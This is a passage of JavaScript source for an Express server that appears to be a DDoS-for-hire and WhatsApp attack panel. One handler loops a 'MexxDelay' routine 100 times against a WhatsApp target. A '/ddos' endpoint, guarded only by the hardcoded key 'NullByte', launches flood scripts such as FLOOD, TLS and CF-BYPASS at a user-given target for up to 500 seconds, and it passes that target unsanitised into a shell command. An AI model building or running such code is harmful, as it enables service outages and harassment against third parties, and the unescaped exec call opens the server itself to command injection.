          await MexxDelay(isTarget)
        }
        break;

      case "call":
        for (let i = 0; i < 100; i++) {
          await MexxDelay(isTarget)
        }
        break;

      case "combo":
        for (let i = 0; i < 100; i++) {
          await MexxDelay(isTarget)
        }
        break;

      default:
        return res.status(400).json({ status: false, message: "Metode tidak dikenali" });
    }

    return res.json({ status: 200, target: target, metode: metode.toLowerCase(), result: "sukses" });

  } catch (err) {
    console.error("Gagal kirim:", err);
    return res.status(500).json({ status: false, message: "Feature Under Construction" });
  }
});

app.post("/ddos", requireAuth, async (req, res) => {
  try {
    const { key, metode, target, time } = req.body;

    if (!key || !metode || !target || !time) {
      return res.status(400).json({
        status: false,
        message: "Required parameters: key, metode, target, time"
      });
    }

    if (key !== "NullByte") {
      return res.status(403).json({
        status: false,
        message: "Incorrect API key"
      });
    }

    const duration = parseInt(time);
    if (isNaN(duration) || duration < 1 || duration > 500) {
      return res.status(400).json({
        status: false,
        message: "Time must be 1 - 500 seconds"
      });
    }

    const validMethods = [
      "BYPASS", "CIBI", "FLOOD", "GLORY",
      "HTTPS", "HTTPX", "HTTP-X", "RAW",
      "TLS", "UAM", "CF", "H2", "CF-BYPASS"
    ];

    if (!validMethods.includes(metode)) {
      return res.status(400).json({
        status: false,
        message: "Method not supported"
      });
    }

    const command = `node ${metode}.js ${target} ${duration}`;
    exec(command, {
      cwd: path.join(__dirname, "methods"),
      timeout: (duration + 10) * 1000
    }, (error, stdout, stderr) => {
      if (error) console.error(`Command error: ${error.message}`);
      if (stderr) console.warn(`Command stderr: ${stderr}`);
      if (stdout) console.log(`Command output: ${stdout}`);
    });

    return res.json({
      status: true,
      Target: target,
      Methods: metode,
      Time: duration,
      Message: "Attack successfully"
    });

  } catch (err) {
    console.error("DDoS endpoint error:", err);
    return res.status(500).json({
      status: false,
      message: "Internal server error"
    });
  }
});

app.use((req, res, next) => {
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    success: false,
    message: 'Internal Server Error'
  });
});

initializeWhatsAppConnections();
bot.launch();

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server is running on port ${PORT}`);
});

